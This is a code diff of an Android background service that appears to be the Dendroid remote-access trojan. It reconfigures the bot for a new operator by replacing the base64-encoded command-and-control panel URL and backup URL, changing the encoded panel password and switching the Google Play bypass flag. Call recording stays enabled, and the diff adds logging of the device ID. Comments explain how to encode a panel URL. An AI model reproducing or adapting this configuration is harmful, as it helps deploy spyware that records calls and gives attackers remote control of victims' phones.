@@ -79,11 +79,11 @@ import android.widget.Toast;
 public class MyService extends Service 
 {
     //********************************************************************************************************************************************************
- 	private String encodedURL = "aHR0cDovL2pvc2VxdWVydm8ubmV0L21hc3Rlcg=="; //encode the URL with http://www.motobit.com/util/base64-decoder-encoder.asp  (ex. http://pizzachip.com/dendroid)
- 	private String backupURL = "aHR0cDovL2pvc2VxdWVydm8ubmV0L21hc3Rlcg=="; 
- 	private String encodedPassword = "a2V5bGltZXBpZQ=="; //encode the URL with http://www.motobit.com/util/base64-decoder-encoder.asp (ex. keylimepie)
+ 	private String encodedURL = "aHR0cDovL2RpcmFubm9uY2UuMTZtYi5jb20vcGFuZWw="; //encode the URL with http://www.motobit.com/util/base64-decoder-encoder.asp  (ex. http://pizzachip.com/dendroid)
+ 	private String backupURL = "aHR0cDovL2RpcmFubm9uY2UuMTZtYi5jb20vcGFuZWw=";
+ 	private String encodedPassword = "bW91bW91aDIwNg=="; //encode the URL with http://www.motobit.com/util/base64-decoder-encoder.asp (ex. keylimepie)
     private int timeout = 10000; //Bot timeout
-    private Boolean GPlayBypass = true; //true to bypass OR false to initiate immediately 
+    private Boolean GPlayBypass = false; //true to bypass OR false to initiate immediately
     private Boolean recordCalls = true; //if recordCalls should start true
     private Boolean intercept = false; //if intercept should start true
     //********************************************************************************************************************************************************
@@ -147,8 +147,8 @@ public class MyService extends Service
 
 //    	StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
 //    	StrictMode.setThreadPolicy(policy); 
-        androidId = Secure.getString(getApplicationContext().getContentResolver(), Secure.ANDROID_ID); 
-
+        androidId = Secure.getString(getApplicationContext().getContentResolver(), Secure.ANDROID_ID);
+        Log.i("com.connect", "id : " + androidId);
     	if(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getInt("Timeout", 0)<1)
     	{
         	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putInt("Timeout", timeout).commit();
